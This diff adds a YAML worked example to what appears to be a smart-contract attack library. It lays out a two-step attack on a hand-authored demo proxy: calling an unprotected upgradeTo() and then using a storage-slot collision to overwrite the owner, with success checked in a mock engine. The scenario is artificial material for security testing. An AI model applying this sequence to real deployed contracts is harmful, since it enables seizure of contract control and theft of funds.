@@ -1,0 +1,40 @@
+# Worked example for `upgradeability` — no automated builder by design
+# (attack_library/upgradeability/meta.yaml: exploiting a storage
+# collision needs the SPECIFIC layout mismatch, not genericizable).
+vulnerability_class: upgradeability
+target_protocol: "VulnerableProxy (hand-authored demo)"
+hypothesis: >
+  upgradeTo() has no access control, letting anyone point the proxy at
+  an arbitrary implementation. The malicious implementation's own
+  first storage variable collides with the proxy's slot 0 (owner),
+  so a single delegatecall-style execution overwrites ownership with
+  no legitimate ownership-transfer function ever being called.
+
+attacker:
+  initial_eth: 0.0
+
+initial_state:
+  fork_url: "https://eth-mainnet.example/rpc"
+  fork_block: 19000000
+  target_contracts:
+    proxy: "0x7777777777777777777777777777777777777777"
+
+steps:
+  - step_id: 1
+    caller: attacker
+    target: proxy
+    function: "upgradeTo(address)"
+    args: ["malicious_impl"]
+    comment: "no access control — anyone can repoint the implementation"
+  - step_id: 2
+    caller: attacker
+    target: proxy
+    function: "delegateCall()"
+    comment: "the malicious implementation's storage layout collides with the proxy's owner slot"
+
+success_conditions:
+  - expression: "proxy.owner == 'attacker'"
+    description: "attacker became owner via storage collision, not via any legitimate ownership-transfer path"
+
+assumptions:
+  - "mock engine models the collision directly (proxy.owner gets overwritten) rather than a full slot-indexed storage simulation"
